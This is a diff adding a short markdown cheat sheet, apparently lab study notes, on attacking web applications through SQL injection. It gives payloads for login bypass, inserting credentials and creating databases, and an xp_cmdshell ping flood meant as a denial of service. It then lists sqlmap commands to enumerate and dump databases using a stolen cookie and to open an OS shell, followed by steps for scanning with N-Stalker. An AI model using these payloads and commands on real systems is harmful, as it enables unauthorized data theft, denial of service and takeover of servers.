@@ -1,0 +1,31 @@
+* Baisc SQL Injection techniques
+    - Try basic payload such as foo'or 1=1--
+    - You can also try foo';insert into login values('john','apple123');-- (This will try to add new creds into database)
+    - You can try to create a database via sqli. Type the input - foo';create database <databasename>;--
+    - You can also perform DOS attack through sqli vuln using below payload.
+         foo';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t';--
+
+* Scanning webapp using N-Stalker Tool:
+    - Open the n-stalker tool and in the the scan options select owasp policy.
+    - Enter the url 
+    - Click on "Start scan wizard"
+    - N-stalker will list out all the vulneribilities.
+
+* PErforming SQLi attack against MSSQL:
+    - Open sqlmap
+    - Get the cookie of the website by typing "document.cookie" in inspect element.
+    - Tpe below sqlmap command:
+        # sqlmap -u "url" --cookie="<cookie_value>" --dbs
+        Above command will test for the sql injection and if it is present it will list out all the available DBs in the website.
+    - To list out tables of the database. type below command:
+        # sqlmap -u "url" --cookie="cookie_value" -D <databasename> --tables
+    - To listout the columns of the tables type below command:
+        # sqlmap -u "url" --cookie="cookie_value" -D <databasename> -T <tablename> --columns
+    - to dump te whole table content type the below command:
+        # sqlmap -u "url" --cookie="cookie_value" -D <databasename> -T <tablename> --dump
+
+* Gain the access of the OS via sqli vuln.
+    # sqlmap -u "url" --cookie="cookie_value" --os-shell
+
+SQLmap Reference :
+https://community.netwitness.com/t5/netwitness-community-blog/from-sql-injection-to-webshell/ba-p/521012
